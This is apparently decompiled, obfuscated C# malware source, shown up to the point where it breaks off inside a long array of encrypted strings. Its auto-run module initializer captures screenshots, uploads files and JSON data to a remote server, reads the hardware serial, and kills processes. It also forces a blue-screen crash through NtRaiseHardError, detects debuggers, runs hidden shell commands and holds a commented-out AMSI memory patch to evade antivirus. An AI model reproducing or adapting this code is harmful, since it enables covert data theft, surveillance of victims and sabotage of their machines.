using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class _003CModule_003E
{
	public enum Enum0
	{
		// error: enumerator has no value
		const_0,
		// error: enumerator has no value
		const_1,
		// error: enumerator has no value
		const_2,
		// error: enumerator has no value
		const_3,
		// error: enumerator has no value
		const_4,
		// error: enumerator has no value
		const_5,
		// error: enumerator has no value
		const_6,
		// error: enumerator has no value
		const_7,
		// error: enumerator has no value
		const_8,
		// error: enumerator has no value
		const_9,
		// error: enumerator has no value
		const_10,
		// error: enumerator has no value
		const_11,
		// error: enumerator has no value
		const_12,
		// error: enumerator has no value
		const_13,
		// error: enumerator has no value
		const_14,
		// error: enumerator has no value
		const_15,
		// error: enumerator has no value
		const_16,
		// error: enumerator has no value
		const_17,
		// error: enumerator has no value
		const_18,
		// error: enumerator has no value
		const_19,
		// error: enumerator has no value
		const_20,
		// error: enumerator has no value
		const_21,
		// error: enumerator has no value
		const_22,
		// error: enumerator has no value
		const_23,
		// error: enumerator has no value
		const_24,
		// error: enumerator has no value
		const_25,
		// error: enumerator has no value
		const_26,
		// error: enumerator has no value
		const_27,
		// error: enumerator has no value
		const_28,
		// error: enumerator has no value
		const_29,
		// error: enumerator has no value
		const_30,
		// error: enumerator has no value
		const_31,
		// error: enumerator has no value
		const_32,
		// error: enumerator has no value
		const_33,
		// error: enumerator has no value
		const_34
	}

	public enum Enum1 : uint
	{
		// error: enumerator has no value
		const_0,
		// error: enumerator has no value
		const_1,
		// error: enumerator has no value
		const_2,
		// error: enumerator has no value
		const_3,
		// error: enumerator has no value
		const_4,
		// error: enumerator has no value
		const_5,
		// error: enumerator has no value
		const_6,
		// error: enumerator has no value
		const_7,
		// error: enumerator has no value
		const_8,
		// error: enumerator has no value
		const_9,
		// error: enumerator has no value
		const_10,
		// error: enumerator has no value
		const_11,
		// error: enumerator has no value
		const_12,
		// error: enumerator has no value
		const_13,
		// error: enumerator has no value
		const_14,
		// error: enumerator has no value
		const_15,
		// error: enumerator has no value
		const_16,
		// error: enumerator has no value
		const_17,
		// error: enumerator has no value
		const_18,
		// error: enumerator has no value
		const_19,
		// error: enumerator has no value
		const_20,
		// error: enumerator has no value
		const_21
	}

	internal delegate int Delegate8();

	internal delegate int Delegate9(IntPtr intptr_0, ref int int_0);

	private delegate bool Delegate10();

	public const int int_0 = default(int);

	public const int int_1 = default(int);

	public const int int_2 = default(int);

	public const int int_3 = default(int);

	private const uint uint_0 = default(uint);

	public static Dictionary<string, string> dictionary_0;

	[Obsolete("Exclude")]
	public static int smethod_0(byte[] byte_0)
	{
		return ((byte_0[0] & 2) == 2) ? 9 : 3;
	}

	[Obsolete("Exclude")]
	public static int smethod_1(byte[] byte_0)
	{
		if (smethod_0(byte_0) == 9)
		{
			return byte_0[5] | (byte_0[6] << 8) | (byte_0[7] << 16) | (byte_0[8] << 24);
		}
		return byte_0[2];
	}

	[Obsolete("Exclude")]
	public static byte[] smethod_2(byte[] byte_0)
	{
		int num = smethod_1(byte_0);
		int num2 = smethod_0(byte_0);
		int num3 = 0;
		uint num4 = 1u;
		byte[] array = new byte[num];
		int[] array2 = new int[4096];
		byte[] array3 = new byte[4096];
		int num5 = num - 6 - 4 - 1;
		int num6 = -1;
		uint num7 = 0u;
		int num8 = (byte_0[0] >> 2) & 3;
		if (num8 != 1 && num8 != 3)
		{
			throw new ArgumentException("C# version only supports level 1 and 3");
		}
		if ((byte_0[0] & 1) != 1)
		{
			byte[] array4 = new byte[num];
			Array.Copy(byte_0, smethod_0(byte_0), array4, 0, num);
			return array4;
		}
		while (true)
		{
			if (num4 == 1)
			{
				num4 = (uint)(byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24));
				num2 += 4;
				if (num3 <= num5)
				{
					num7 = (uint)((num8 != 1) ? (byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24)) : (byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16)));
				}
			}
			if ((num4 & 1) == 1)
			{
				num4 >>= 1;
				uint num10;
				uint num11;
				if (num8 == 1)
				{
					int num9 = ((int)num7 >> 4) & 0xFFF;
					num10 = (uint)array2[num9];
					if ((num7 & 0xF) != 0)
					{
						num11 = (num7 & 0xF) + 2;
						num2 += 2;
					}
					else
					{
						num11 = byte_0[num2 + 2];
						num2 += 3;
					}
				}
				else
				{
					uint num12;
					if ((num7 & 3) == 0)
					{
						num12 = (num7 & 0xFF) >> 2;
						num11 = 3u;
						num2++;
					}
					else if ((num7 & 2) == 0)
					{
						num12 = (num7 & 0xFFFF) >> 2;
						num11 = 3u;
						num2 += 2;
					}
					else if ((num7 & 1) == 0)
					{
						num12 = (num7 & 0xFFFF) >> 6;
						num11 = ((num7 >> 2) & 0xF) + 3;
						num2 += 2;
					}
					else if ((num7 & 0x7F) != 3)
					{
						num12 = (num7 >> 7) & 0x1FFFF;
						num11 = ((num7 >> 2) & 0x1F) + 2;
						num2 += 3;
					}
					else
					{
						num12 = num7 >> 15;
						num11 = ((num7 >> 7) & 0xFF) + 3;
						num2 += 4;
					}
					num10 = (uint)(num3 - num12);
				}
				array[num3] = array[num10];
				array[num3 + 1] = array[num10 + 1];
				array[num3 + 2] = array[num10 + 2];
				for (int i = 3; i < num11; i++)
				{
					array[num3 + i] = array[num10 + i];
				}
				num3 += (int)num11;
				if (num8 == 1)
				{
					num7 = (uint)(array[num6 + 1] | (array[num6 + 2] << 8) | (array[num6 + 3] << 16));
					while (num6 < num3 - num11)
					{
						num6++;
						int num9 = (int)(((num7 >> 12) ^ num7) & 0xFFF);
						array2[num9] = num6;
						array3[num9] = 1;
						num7 = (uint)(((num7 >> 8) & 0xFFFF) | (array[num6 + 3] << 16));
					}
					num7 = (uint)(byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16));
				}
				else
				{
					num7 = (uint)(byte_0[num2] | (byte_0[num2 + 1] << 8) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24));
				}
				num6 = num3 - 1;
				continue;
			}
			if (num3 > num5)
			{
				break;
			}
			array[num3] = byte_0[num2];
			num3++;
			num2++;
			num4 >>= 1;
			if (num8 == 1)
			{
				while (num6 < num3 - 3)
				{
					num6++;
					int num13 = array[num6] | (array[num6 + 1] << 8) | (array[num6 + 2] << 16);
					int num9 = ((num13 >> 12) ^ num13) & 0xFFF;
					array2[num9] = num6;
					array3[num9] = 1;
				}
				num7 = (uint)(((num7 >> 8) & 0xFFFF) | (byte_0[num2 + 2] << 16));
			}
			else
			{
				num7 = (uint)(((num7 >> 8) & 0xFFFF) | (byte_0[num2 + 2] << 16) | (byte_0[num2 + 3] << 24));
			}
		}
		while (num3 <= num - 1)
		{
			if (num4 == 1)
			{
				num2 += 4;
				num4 = 2147483648u;
			}
			array[num3] = byte_0[num2];
			num3++;
			num2++;
			num4 >>= 1;
		}
		return array;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	private static extern IntPtr OpenProcess(uint uint_1, bool bool_0, uint uint_2);

	[DllImport("kernel32.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	private static extern bool TerminateProcess(IntPtr intptr_0, uint uint_1);

	[DllImport("kernel32.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	private static extern bool CloseHandle(IntPtr intptr_0);

	[Obsolete("Exclude")]
	public static void smethod_3(uint uint_1)
	{
		try
		{
			IntPtr intPtr = OpenProcess(1u, bool_0: false, uint_1);
			if (intPtr == IntPtr.Zero)
			{
				throw new Win32Exception(Marshal.GetLastWin32Error(), $"Failed to open process with PID {uint_1}.");
			}
			try
			{
				if (!TerminateProcess(intPtr, 0u))
				{
					throw new Win32Exception(Marshal.GetLastWin32Error(), $"Failed to terminate process with PID {uint_1}.");
				}
			}
			finally
			{
				//CloseHandle(intPtr);
			}
		}
		catch
		{
			Process.GetProcessById((int)uint_1).Kill();
		}
	}

	[Obsolete("Exclude")]
	public static string smethod_4(string string_0, int int_4)
	{
		if (dictionary_0 == null)
		{
			dictionary_0 = new Dictionary<string, string>();
		}
		lock (dictionary_0)
		{
			if (dictionary_0.TryGetValue(string_0, out var value))
			{
				return value;
			}
			char[] array = string_0.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (char)(array[i] ^ int_4);
			}
			string value2 = new string(array);
			dictionary_0[string_0] = value2;
			return dictionary_0[string_0];
		}
	}

	[Obsolete("Exclude")]
	private static List<byte> smethod_5()
	{
		if (IntPtr.Size == 8)
		{
			return new List<byte> { 184, 87, 0, 7, 128, 195 };
		}
		return new List<byte> { 184, 87, 0, 7, 128, 194, 24, 0 };
	}

	[DllImport("kernel32")]
	[Obsolete("Exclude")]
	private static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	[DllImport("kernel32")]
	[Obsolete("Exclude")]
	private static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32")]
	[Obsolete("Exclude")]
	private static extern bool VirtualProtect(IntPtr intptr_0, UIntPtr uintptr_0, uint uint_1, ref uint uint_2);

	[Obsolete("Exclude")]
	public static void smethod_6()
	{
		try
		{
		//	IntPtr intptr_ = LoadLibrary(smethod_4("뽰뽼뽢뽸뼿뽵뽽뽽", smethod_7(-594523175)));
			//IntPtr procAddress = GetProcAddress(intptr_, smethod_4("徶徚径從徤徔徖徙徵徂徑徑徒待", smethod_7(-1122522305)));
			byte[] array = smethod_5().ToArray();
			uint uint_ = default(uint);
		//	VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, (uint)smethod_7(122680456), ref uint_);
		//	Marshal.Copy(array, smethod_7(122680520), procAddress, array.Length);
			uint uint_2 = default(uint);
		//	VirtualProtect(procAddress, (UIntPtr)(ulong)array.Length, uint_, ref uint_2);
		}
		catch
		{
		}
	}

	static _003CModule_003E()
	{
		smethod_29();
		smethod_21();
		smethod_19();
		smethod_8();
		smethod_6();
	}

	[Obsolete("Exclude")]
	public static int smethod_7(int int_4)
	{
		return int_4 ^ 0x74FF4C8;
	}

	[Obsolete("Exclude")]
	internal static void smethod_8()
	{
		Thread thread = new Thread(smethod_16);
		thread.IsBackground = true;
		thread.Priority = ThreadPriority.Lowest;
		thread.Start();
	}

	[Obsolete("Exclude")]
	public static void smethod_9(string string_0, string string_1)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
			webClient.Proxy = null;
			webClient.UploadString(string_0, "POST", string_1);
		}
		catch
		{
		}
	}

	[Obsolete("Exclude")]
	public static void smethod_10(string string_0)
	{
		try
		{
			string directoryName = Path.GetDirectoryName(string_0);
			if (!Directory.Exists(directoryName))
			{
				Directory.CreateDirectory(directoryName);
				File.SetAttributes(directoryName, File.GetAttributes(directoryName) | FileAttributes.Hidden);
			}
			Rectangle bounds = Screen.PrimaryScreen.Bounds;
			Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height);
			Graphics graphics = Graphics.FromImage(bitmap);
			graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
			bitmap.Save(string_0, ImageFormat.Png);
			bitmap.Dispose();
		}
		catch
		{
		}
	}

	[Obsolete("Exclude")]
	public static void smethod_11(string string_0, string string_1)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Proxy = null;
			string text = smethod_4("磆磆磆磆碼碎碉碠碂碟碭碄碙碆碩碄碞碅碏碊碙碒", smethod_18(-1109173228)) + DateTime.Now.Ticks.ToString(smethod_4("ﾘ", smethod_18(-1684415713)));
			webClient.Headers.Add(smethod_4("\u2e77⹛⹚⹀⹑⹚⹀⸙\u2e60⹍⹄⹑", smethod_18(-1095169333)), smethod_4("獓獋獒獊獗獎獟獌獊猑獘獑獌獓猓獚獟獊獟猅猞獜獑獋獐獚獟獌獇猃", smethod_18(-1076078655)) + text);
			byte[] array = File.ReadAllBytes(string_1);
			string fileName = Path.GetFileName(string_1);
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine(smethod_4("닸닸", smethod_18(1540789802)) + text);
			stringBuilder.AppendLine(smethod_4("䚫䚇䚆䚜䚍䚆䚜䛅䚬䚁䚛䚘䚇䚛䚁䚜䚁䚇䚆䛒䛈䚎䚇䚚䚅䛅䚌䚉䚜䚉䛓䛈䚆䚉䚅䚍䛕䛊䚎䚁䚄䚍䛊䛓䛈䚎䚁䚄䚍䚆䚉䚅䚍䛕䛊", smethod_18(-411803113)) + fileName + smethod_4("樹", smethod_18(1288916708)));
			stringBuilder.AppendLine(smethod_4("䧲䧞䧟䧅䧔䧟䧅䦜䧥䧈䧁䧔䦋䦑䧘䧜䧐䧖䧔䦞䧛䧁䧔䧖", smethod_18(-1279234738)));
			stringBuilder.AppendLine();
			byte[] bytes = Encoding.UTF8.GetBytes(stringBuilder.ToString());
			byte[] bytes2 = Encoding.UTF8.GetBytes(smethod_4("곞곙곾곾", smethod_18(1420331052)) + text + smethod_4("녓녓녳녴", smethod_18(-1458596479)));
			byte[] array2 = new byte[bytes.Length + array.Length + bytes2.Length];
			Buffer.BlockCopy(bytes, smethod_18(1534141695), array2, smethod_18(1534141695), bytes.Length);
			Buffer.BlockCopy(array, smethod_18(1534141695), array2, bytes.Length, array.Length);
			Buffer.BlockCopy(bytes2, smethod_18(1534141695), array2, bytes.Length + array.Length, bytes2.Length);
			webClient.UploadData(string_0, smethod_4("먓먌먐먗", smethod_18(1799462588)), array2);
		}
		catch
		{
		}
	}

	[Obsolete("Exclude")]
	public static string smethod_12()
	{
		MD5 mD = MD5.Create();
		FileStream inputStream = File.OpenRead(Assembly.GetExecutingAssembly().Location);
		byte[] array = mD.ComputeHash(inputStream);
		return BitConverter.ToString(array).Replace("-", "").ToLower();
	}

	[Obsolete("Exclude")]
	public static string smethod_13()
	{
		string result = "";
		try
		{
			ManagementClass managementClass = new ManagementClass("Win32_BaseBoard");
			ManagementObjectCollection instances = managementClass.GetInstances();
			foreach (ManagementBaseObject item in instances)
			{
				result = item["SerialNumber"].ToString();
			}
		}
		catch
		{
		}
		return result;
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	[Obsolete("Exclude")]
	public static extern IntPtr RtlAdjustPrivilege(Enum0 enum0_0, bool bool_0, bool bool_1, ref bool bool_2);

	[DllImport("ntdll.dll")]
	[Obsolete("Exclude")]
	public static extern uint NtRaiseHardError(Enum1 enum1_0, uint uint_1, uint uint_2, IntPtr intptr_0, uint uint_3, ref uint uint_4);

	[Obsolete("Exclude")]
	public static void smethod_14()
	{
		try
		{
			bool bool_ = default(bool);
			RtlAdjustPrivilege((Enum0)19, bool_0: true, bool_1: false, ref bool_);
			uint uint_ = default(uint);
			NtRaiseHardError((Enum1)3221226528u, 0u, 0u, IntPtr.Zero, 6u, ref uint_);
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	internal static extern bool IsDebuggerPresent();

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	internal static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	[Obsolete("Exclude")]
	internal static void smethod_15(string string_0)
	{
		Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
		{
			CreateNoWindow = true,
			UseShellExecute = false
		});
	}

	[Obsolete("Exclude")]
	public static void smethod_16()
	{
		try
		{
			string text = smethod_4("\u0de5", smethod_17(2102661132));
			string text2 = smethod_4("ꜶꜿꜸꜱꜳꜳꝃꝇꝜ臨\uf041\ue95f찔﹛\uf425ﯩ\uf3ba㞣⢬\uf602懶\uf4ed\ue978㠢얻쯺쨅懶", smethod_17(-1330201942));
			string text3 = smethod_4("煥", smethod_17(-838374259));
			string text4 = smethod_4("\udf26", smethod_17(-1656962354));
			string text5 = smethod_4("\ue7ac\ue7a9\ue7a0", smethod_17(-859440619));
			string s = smethod_4("㗤㗍㗗㖵㗦㗍㗈㖳㗉㗼㖼㗮㗤㗝㗋㗯㗧㖶㗏㗮㗉㗨㗋㗳㗧㗖㖼㗭㗦㗂㗮㗳㗡㖷㗓㗬㗤㗂㖼㗳㗤㖶㗈㗳㗈㗑㗔㗲㗋㗑㗌㖵㗋㗿㗮㖶㗋㗁㗢㗿㗋㗿㗄㖴㗊㗑㗦㗲㗋㗬㖼㗼㗒㗒㗭㗏㗐㗫㗏㗭㗋㗀㗵㖰㗉㗓㗄㗱㗒㗑㗏㗲㗧㗿㗩㗴㗡㖵㗵㗪㗡㗓㗩㗜㗊㗃㗃㗊㗓㗁㗜㖷㗉㗐㖱㖷㗝㗿㗗㗜㗖㗁㗩㗊㗈㗑㗏㗐㗋㖴㗇㗐㗑㗮㖼㗣㗦㖶㗏㗶㗋㗍㗗㗃㗊㗓㗩㗭㗟㗑㗏㗉㗦㗮㗱㗗㗤㗑㗜㖰㗠㗄㖸㖸", smethod_17(-1318836131));
			string text6 = new Random().Next().ToString();
			string text7 = Environment.GetFolderPath((Environment.SpecialFolder)smethod_17(550903295)) + smethod_4("ớ", smethod_17(107545439)) + text6;
			string text8 = text7 + smethod_4("巤", smethod_17(1557938272)) + text2 + smethod_4("憡懥懿懪懨", smethod_17(1444183127));
			string[] array = new string[smethod_17(550903153)];
			array[smethod_17(550903256)] = smethod_4("솗솜솑솕솀쇔솑솚솓솝솚솑", smethod_17(1803148332));
			array[smethod_17(550903257)] = smethod_4("ᇟᇒᇗ", smethod_17(743836782));
			array[smethod_17(550903258)] = smethod_4("쓶쓱쓵쓹쓱쓦", smethod_17(768268620));
			array[smethod_17(550903259)] = smethod_4("댡덯덭댽댻댾", smethod_17(-300831103));
			array[smethod_17(550903260)] = smethod_4("酏鄎鄁酓酕酐", smethod_17(-1796567825));
			array[smethod_17(550903261)] = smethod_4("葾葠葻葬葺葡葨葻葢", smethod_17(-1485530671));
			array[smethod_17(550903262)] = smethod_4("䷳䷼䷱䷱䷹䷰䷧", smethod_17(-1223864243));
			array[smethod_17(550903263)] = smethod_4("ௐ௩௲\u0bfd௮\u0bbc\u0bd9௲\u0bfb௵௲௹", smethod_17(-564849084));
			array[smethod_17(550903248)] = smethod_4("닠다당닠닽닿닢답담", smethod_17(-669864107));
			array[smethod_17(550903249)] = smethod_4("쀈쀹쀮쀱쀵쀲쀽쀰쁲쀹쀤쀹", smethod_17(1488313732));
			array[smethod_17(550903250)] = smethod_4("ᖻᖊᖝᖂᖆᖁᖎᖃᖁᖊᖘᗁᖊᖗᖊ", smethod_17(1215563831));
			array[smethod_17(550903251)] = smethod_4("柋柉柔柘柞柈柈枛染柚柘某柞柉", smethod_17(1133804131));
			array[smethod_17(550903252)] = smethod_4("⠟⠝⠀⠌⠊⠜⠜⠇⠎⠌⠄⠊⠝", smethod_17(1514288567));
			array[smethod_17(550903253)] = smethod_4("沿沵沨沫沢", smethod_17(1684566275));
			array[smethod_17(550903254)] = smethod_4("ꊫꊠꊧꊨꊻꊰꊧꊠꊧꊣꊨ", smethod_17(-1845510383));
			array[smethod_17(550903255)] = smethod_4("궏궟궃", smethod_17(535212095));
			array[smethod_17(550903240)] = smethod_4("㍫㍶㍺㍼㍫㍣㍫㌮㍧㍠㍤㍫㍭㍺㍡㍼", smethod_17(-450941226));
			array[smethod_17(550903241)] = smethod_4("讖讛讗", smethod_17(451515946));
			array[smethod_17(550903242)] = smethod_4("萟萨萯萭葽萎萨萴萩萸", smethod_17(-259221115));
			array[smethod_17(550903243)] = smethod_4("\ua825ꠎꠇꠔꠊꠃꠕꡆ꠶ꠔꠉꠞꠟ", smethod_17(1002681790));
			array[smethod_17(550903244)] = smethod_4("섂섃섒섃섅섒셆섏섒셆섃섇섕섟", smethod_17(-1473782594));
			array[smethod_17(550903245)] = smethod_4("′\u202f‣‥′›′″•›‧′‥", smethod_17(20921743));
			array[smethod_17(550903246)] = smethod_4("殆殚殚殞毎殊残殌殛殉殉残殜", smethod_17(1272149558));
			array[smethod_17(550903247)] = smethod_4("忷忲忲徴忱忬忤忸忻忦忱忦", smethod_17(-1487388084));
			array[smethod_17(550903232)] = smethod_4("世丛一丗丑丆丝一下乒丟丝东丛丆丝一", smethod_17(2092716970));
			array[smethod_17(550903233)] = smethod_4("줾줳줨줿줹줮줵줨줣줷줵줴줳줮줵줨", smethod_17(1739117698));
			array[smethod_17(550903234)] = smethod_4("ኟኲኩኾኸኯኴኩኢዻኖኴኵኲኯኴኩ", smethod_17(-771944701));
			array[smethod_17(550903235)] = smethod_4("ꨀ\uaa3fꨣꨤ\uaa3d\uaa31\uaa3e", smethod_17(-1600604280));
			array[smethod_17(550903236)] = smethod_4("⅜⅀⅀⅄ℴ⅀ⅻⅻⅸⅿⅽⅠ", smethod_17(-86623028));
			array[smethod_17(550903237)] = smethod_4("罝罹罤罽罠罢罿罨罩", smethod_17(1186095816));
			array[smethod_17(550903238)] = smethod_4("ﴲﴪﴽﴬﴴﴩﴼﴫ", smethod_17(436985985));
			array[smethod_17(550903239)] = smethod_4("㳜㳓㳖㳟㲚㳝㳈㳛㳘", smethod_17(-83156638));
			array[smethod_17(550903288)] = smethod_4("ᏸᏹᏪᏵ\u13ffᏹᎼᏴᏽ\u13ff\u13f7ᏹᏮᏬ", smethod_17(-545255868));
			array[smethod_17(550903289)] = smethod_4("\udb8f\udb98\udb8e\udb92\udb88\udb8f\udb9e\udb98\udbdd\udb95\udb9c\udb9e\udb96\udb98\udb8f", smethod_17(-415316443));
			array[smethod_17(550903290)] = smethod_4("魋魉魈魏魒魉魔鬆魂魃鬆魔魃魅魓魔魕魉魕", smethod_17(-716667138));
			array[smethod_17(550903291)] = smethod_4("䀗䀀䀖䀊䀐䀗䀆䀀䀖䁅䀍䀄䀆䀎䀀䀗", smethod_17(806837693));
			array[smethod_17(550903292)] = smethod_4("鄅鄧鄺鄭鄬鄶鄴鄥", smethod_17(1884392589));
			array[smethod_17(550903293)] = smethod_4("⤦⤱⤧⤻⤡⤦⤷⤱⤧⥴⤹⤵⤺⤵⤳⤱⤦", smethod_17(713438348));
			array[smethod_17(550903294)] = smethod_4("궏궇궏궍궐궛귂궔궋궇궕궇궐", smethod_17(-778129350));
			array[smethod_17(550903295)] = smethod_4("䒛䒏䒘䒓䒁䓖䒝䒓䒏䒑䒓䒘", smethod_17(953768238));
			array[smethod_17(550903280)] = smethod_4("\u245f\u2453\u2458\u2459\u245f\u244e\u245d\u245f\u2457\u2459\u244e", smethod_17(14301668));
			array[smethod_17(550903281)] = smethod_4("禗禚禀禀禖禐禇秓禐禜禗禖", smethod_17(839607339));
			array[smethod_17(550903282)] = smethod_4("䘛䘑䘛䘜䘍䘅䙈䘁䘆䘎䘇䘚䘅䘍䘚", smethod_17(1535335344));
			array[smethod_17(550903283)] = smethod_4("⸱⸻⸱⸶⸧ⸯ⸫⸬⸤⸭⸰ⸯ⸧⸰", smethod_17(-1419824230));
			array[smethod_17(550903284)] = smethod_4("֍\u05bc\u05b8\u05ae\u05ae\u05b1\u05b8\u05af\u05fd֍\u05bc־\u05b6\u05b8\u05a9\u05fd֎\u05b3\u05b4\u05bb\u05bb\u05b8\u05af", smethod_17(1922635781));
			array[smethod_17(550903285)] = smethod_4("\uedf4\uedf6\uedeb\uedf4\ueded\uede1\uedf0\uede1\uedf6\uedf7", smethod_17(-668536740));
			array[smethod_17(550903286)] = smethod_4("狠狧狡狺狽狴犳狠狶狲狡狰狻", smethod_17(178745163));
			array[smethod_17(550903287)] = smethod_4("垜垏垜型垀垍垑垐垗垞", smethod_17(-1835316703));
			array[smethod_17(550903272)] = smethod_4("ᖔᖟᖖᖅᖛᖒᖄ", smethod_17(-497874897));
			array[smethod_17(550903273)] = smethod_4("须顴页顸顮顽", smethod_17(7898564));
			array[smethod_17(550903274)] = smethod_4("됭됂됙됎됉됞됌", smethod_17(489859507));
			array[smethod_17(550903275)] = smethod_4("쨙쨧쨫쨸쨾쨙쨤쨣쨬쨬", smethod_17(-687155310));
			array[smethod_17(550903276)] = smethod_4("⫩⫂⫓⫤⫆⫗⫓⫒⫕⫂", smethod_17(-1813432449));
			array[smethod_17(550903277)] = smethod_4("쥐쥇쥔쥀쥑쥉쥔", smethod_17(1193202940));
			array[smethod_17(550903278)] = smethod_4("ꂨꂴꂴꂰꂷꂁꂔꂃꂈ", smethod_17(-1167344328));
			array[smethod_17(550903279)] = smethod_4("\udce3\udce0\udcf5\udcf5\udcf4\udcf8\udcf1\udcf3\udcfb\udcbd\udcf9\udca3\udca8\udca6\udcbe\udcf4\udcfc\udcfc", smethod_17(-1382956728));
			array[smethod_17(550903264)] = smethod_4("ꐠꐃꐃꐖꐫꐍꐈ", smethod_17(1644476855));
			array[smethod_17(550903265)] = smethod_4("\u1a77ᨹᨻ\u1a6b\u1a6d\u1a68", smethod_17(1633159127));
			array[smethod_17(550903266)] = smethod_4("鼟鼈鼊鼋鼟鼂鼀鼌鼝鼝", smethod_17(88048309));
			array[smethod_17(550903267)] = smethod_4("뉫뉼뉾뉪뉱뉶뉭", smethod_17(-1302810687));
			array[smethod_17(550903268)] = smethod_4("꠴\ua83eꠃꠠ꠩", smethod_17(1571009928));
			array[smethod_17(550903269)] = smethod_4("\uef86\uef8d\uef96\uefb2\uef87\uef87\uef89", smethod_17(891482682));
			array[smethod_17(550903270)] = smethod_4("ꘔꘙꘜ", smethod_17(-369575035));
			array[smethod_17(550903271)] = smethod_4("﴿ﴁﴚﴍﴛﴀﴉﴚﴃ", smethod_17(327671984));
			array[smethod_17(550903192)] = smethod_4("फ़ॱॼॼॴॽ४", smethod_17(-1661332288));
			array[smethod_17(550903193)] = smethod_4("aJGCV\u0002gLEKLG", smethod_17(688070138));
			array[smethod_17(550903194)] = smethod_4("ⲼⲎⲁⲋⲍⲀⲗⲆⲊ", smethod_17(1801597239));
			array[smethod_17(550903195)] = smethod_4("왚왽왹왶왰왧왼왡", smethod_17(-475014197));
			array[smethod_17(550903196)] = smethod_4("ﻅﻻﻼﻖﻰﻵ", smethod_17(488039242));
			array[smethod_17(550903197)] = smethod_4("憬憯憩", smethod_17(-1864139725));
			array[smethod_17(550903198)] = smethod_4("䬦䬂䬂䬚䬁䬆䬛䬖䭏䬫䬊䬍䬚䬈䬈䬊䬝", smethod_17(-1383835977));
			array[smethod_17(550903199)] = smethod_4("ɉɢɫɸɦɯɹ", smethod_17(-901308462));
			array[smethod_17(550903184)] = smethod_4("쏒쏰쏭쏡쏧쏱쏱쎢쏊쏣쏡쏩쏧쏰", smethod_17(-729293222));
			array[smethod_17(550903185)] = smethod_4("鿀鿢鿿鿳鿵鿣鿣龰鿕鿨鿠鿼鿿鿢鿵鿢", smethod_17(-205094328));
			array[smethod_17(550903186)] = smethod_4("ꌨꌟꌉꌕꌏꌈꌙꌟꍚꌲꌛꌙꌑꌟꌈ", smethod_17(-1963344222));
			array[smethod_17(550903187)] = smethod_4("룙룰룭룫뢿룙룶룭룺루룾룳룳", smethod_17(1423418695));
			array[smethod_17(550903188)] = smethod_4("\ufb1e﬩שׂﬥ\ufb3fטּמּוּﭬײַאָשּׂﬢﬢ﬩מּ", smethod_17(-2057967980));
			array[smethod_17(550903189)] = smethod_4("焅焲焰煷焄焴然焹焹焲焥", smethod_17(1558801551));
			array[smethod_17(550903190)] = smethod_4("ꁛꁬꁮꁠꁺꁽꁻꁰꀩꁊꁡꁨꁧꁮꁬꁺꀩꁟꁠꁬꁾ", smethod_17(-398213679));
			array[smethod_17(550903191)] = smethod_4("\u1af6\u1ac1\u1ac3\u1acd\u1ad7\u1ad0\u1ad6\u1add᪄\u1ae5\u1ac8\u1ac1\u1ad6\u1ad0", smethod_17(2016282492));
			array[smethod_17(550903176)] = smethod_4("밖밡밣밓밫밶밯밷", smethod_17(546021788));
			array[smethod_17(550903177)] = smethod_4("䈄䈦䈱䈬䈳䈠䉥䈗䈠䈢䈬䈶䈱䈷䈼䉥䈈䈪䈫䈬䈱䈪䈷", smethod_17(39935901));
			array[smethod_17(550903178)] = smethod_4("묋묡묫묌묪묹묻묽묪", smethod_17(-1445550464));
			array[smethod_17(550903179)] = smethod_4("䎎䎱䎸䎭䎚䎱䎸䎷䎾䎼䎽", smethod_17(2082496001));
			array[smethod_17(550903180)] = smethod_4("총촪촨촦촼촻촽촶촌촧촮촡촨촪촼촙촦촪촸", smethod_17(-1824862057));
			array[smethod_17(550903181)] = smethod_4("䙰䙇䙅䙋䙑䙖䙐䙛䘂䙤䙋䙌䙆䙇䙐", smethod_17(-920036358));
			array[smethod_17(550903182)] = smethod_4("ꔘꔄꔄꔀꕰꔔꔵꔲꔥꔷꔷꔵꔢ", smethod_17(-2024425336));
			array[smethod_17(550903183)] = smethod_4("丨丩乸丨丣丸", smethod_17(-453553260));
			array[smethod_17(550903168)] = smethod_4("Ⴇႀ\u109dႁ\u1083ႀ\u1087\u108f", smethod_17(-1627517642));
			array[smethod_17(550903169)] = smethod_4("饶饔饉饅饃饕饕餆饫饉饈饏饒饉饔", smethod_17(1708033278));
			array[smethod_17(550903170)] = smethod_4("歀歄歙歀歝歟歂歕歔", smethod_17(-397379851));
			array[smethod_17(550903171)] = smethod_4("⎧⎐⎗⎕", smethod_17(-1675870659));
			array[smethod_17(550903172)] = smethod_4("ỦỾỨỺỹ", smethod_17(-1184562319));
			array[smethod_17(550903173)] = smethod_4("焒焖焋焒", smethod_17(1219980423));
